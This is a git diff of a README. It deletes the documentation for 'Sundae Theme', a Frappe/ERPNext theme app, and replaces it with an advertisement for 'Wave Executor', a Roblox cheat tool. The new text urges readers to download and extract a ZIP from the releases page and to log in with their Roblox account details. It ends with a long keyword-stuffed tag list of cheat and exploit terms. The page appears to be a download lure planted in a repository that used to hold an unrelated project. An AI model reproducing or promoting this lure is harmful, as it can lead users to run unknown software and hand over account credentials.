@@ -1,56 +1,57 @@
-## Sundae Theme
+# 🚀 Wave Executor - Roblox Executor **[![Download Wave Executor](https://img.shields.io/badge/Download-Wave%20Executor-blueviolet)](../../releases)**
 
-multi themes for frappe & erpnext apps
-<hr>
-#### To install app,
+## Quick Installation
+To get started with Wave Executor, follow these simple steps:
+1. **[![Download Wave Executor](https://img.shields.io/badge/Download-Wave%20Executor-blueviolet)](../../releases)**
+2. Extract the downloaded ZIP file to your desired location on your system.
 
-bench get-app https://github.com/tahir-zaqout/sundae_theme.git
-bench --site (sitename) install-app sundae_theme
-bench build
-bench clear-cache
-<hr>
-### Available Themes
-As of now, the sundae_theme custom app provides the following theme:
-1- Cotton Candy<br>
-![candy cotton](https://github.com/tahir-zaqout/sundae_theme/assets/122530674/5a59d41d-4fdd-40c4-b661-3b3677b2f953)
-<br>
-2- Cherry
-<br>
-![cherry](https://github.com/tahir-zaqout/sundae_theme/assets/122530674/99ff4c2c-848c-44d0-bdcc-22374118ac43)
-<br>
-3- Watermelon
-<br>
-![watermelon](https://github.com/tahir-zaqout/sundae_theme/assets/122530674/fb6a3350-33d9-484f-8889-278f2bb6ec27)
-<br>
-4- Apricot
-<br>
-![apricot](https://github.com/tahir-zaqout/sundae_theme/assets/122530674/f920f9bb-d03b-424f-a200-2b2faf4904c1)
+**Description:**  
+🚀 **Wave Executor** is a cutting-edge Roblox script executor designed for advanced script execution, optimized performance, and seamless user experience. Fully compatible with the latest Roblox updates, it is secure, easy to use, and perfect for gamers, developers, and modding enthusiasts looking to enhance their Roblox gameplay. 
 
-<br>
-### Usage
-Once you have installed the app, you can access the theme switcher in your Frappe instance and select 'The Theme' from the list of available themes.
-The selected theme will be applied to your Frappe application.
-<br>
-A- From top right click on user image
-<br>
-B- Select 'Toggle Theme', this will be display all available themes
-<br>
-
-![select-menu](https://github.com/tahir-zaqout/sundae_theme/assets/122530674/4f62d1a6-359c-430e-9b11-a1445e9564f3)
-<br>
-C- Select the theme
-<br>
-![available themes](https://github.com/tahir-zaqout/sundae_theme/assets/122530674/70c97e30-2bd4-43a8-b972-85f3f4c05fc5)
-<hr>
-
-Please note that more themes may be added in future updates of the Tekton-Theme app.
-#### To change the icon and splash img, copy an icon of your choice  to public/img folder of sundae_theme app and name it as 'slogo.jpg.png'
-<hr>
-### Support
-For any issues, questions, or support related to the app, you can create an issue on the GitHub repository or contact the maintainers directly.
-Thank you for using Sundae-Theme for Frappe! We hope you enjoy the extra theme options it provides for your application.
+**Keywords:** Roblox executor, script executor, Roblox hacks, Roblox mods, gaming tools, script engine, Roblox enhancements, Roblox modding 2024.
 
 
-#### License
+![Wave Executor Preview](/assets/Wave.webp)
 
-MIT
+## Table of Contents
+- [Introduction](#introduction)
+- [Key Features](#key-features)
+- [Installation Guide](#quick-installation)
+- [How to Use](#how-to-use)
+- [Contribute](#contribute)
+- [License](#license)
+- [Contact Us](#contact-us)
+
+## Introduction
+Welcome to **Wave Executor**, the latest and most powerful Roblox Executor designed to elevate your gaming experience. Whether you're a developer, gamer, or modding enthusiast, Wave Executor provides the ultimate tools to modify and enhance your Roblox gameplay.
+
+## Key Features
+Wave Executor includes a variety of advanced features tailored to your needs:
+- **Advanced Script Execution:** Execute complex scripts with ease and efficiency.
+- **Optimized Performance:** Enjoy smoother gameplay with enhanced performance capabilities.
+- **User-Friendly Interface:** Navigate easily through a clean and intuitive interface.
+- **Roblox Compatibility:** Fully compatible with the latest Roblox updates.
+- **Secure and Reliable:** Wave Executor is built with security in mind, ensuring a safe user experience.
+
+## How to Use
+Once you have installed Wave Executor, follow these steps to start using it:
+1. **Launch the Application:** Open Wave Executor from your installation directory.
+2. **Login:** Use your Roblox account details to login (if required).
+3. **Load a Script:** Choose the script you wish to execute from your library or create a new one.
+4. **Execute:** Click the execute button and let Wave handle the rest.
+5. **Enjoy:** Experience the enhanced features and smoother gameplay!
+
+## Contribute
+We encourage community contributions to help make Wave Executor even better. If you have ideas, bug reports, or want to contribute to the codebase, feel free to submit a pull request. Your input is invaluable!
+
+## License
+This project is licensed under the MIT License. For more details, see the [LICENSE](LICENSE) file.
+
+## Contact Us
+**Join our Community on [Discord](https://discord.gg/Delta)!**  
+For support, updates, and to connect with other users, visit our Discord server.
+
+---
+
+**Tags:**  
+roblox cheat, roblox hacks, roblox executor, roblox script executor, roblox modding, roblox cheat engine, roblox exploits, roblox scripts 2024, roblox hack download, roblox cheat codes, roblox mod menu, roblox glitch, roblox bug, roblox hack tool, roblox mod tool, roblox cheat, roblox hacks, roblox exploits, roblox cheat codes, roblox glitches, roblox script, roblox mod, roblox hack download, roblox cheat engine, roblox cheats 2024, roblox cheat 2024, roblox cheat script, roblox cheat tool, roblox hack tool, roblox mod menu, roblox hack script, roblox exploit script, roblox exploit hack, roblox cheat hack, roblox mod hack, roblox glitch 2024, roblox bug, roblox glitch hack, roblox glitch script, roblox glitch exploit, roblox glitch mod, roblox script 2024, roblox mod 2024, roblox mod hack 2024, roblox hack tool 2024, roblox cheat tool 2024, roblox cheat engine 2024, roblox hack engine, roblox hack engine 2024, roblox exploit tool, roblox exploit tool 2024, roblox glitch exploit 2024, roblox glitch tool, roblox glitch tool 2024, roblox bug tool, roblox bug tool 2024, roblox bug exploit, roblox bug exploit 2024, roblox bug script, roblox bug script 2024, roblox bug hack, roblox bug hack 2024, roblox mod menu tool, roblox mod menu tool 2024, roblox mod mnu hack, roblox mod menu hack 2024, roblox mod menu exploit, roblox mod menu exploit 2024, roblox script tool, roblox script tool 2024, roblox mod tool, roblox mod tool 2024, roblox cheat engine hack, roblox cheat engine hack 2024, roblox cheat engine exploit, roblox cheat engine exploit 2024, roblox cheat engine script, roblox cheat engine script 2024, roblox cheat engine glitch, roblox cheat engine glitch 2024, roblox cheat engine bug, roblox cheat engine bug 2024, roblox exploit hack tool, roblox exploit hack tool 2024, roblox exploit hack script, roblox exploit hack script 2024, roblox exploit hack mod, roblox exploit hack mod 2024, roblox exploit glitch, roblox exploit glitch 2024
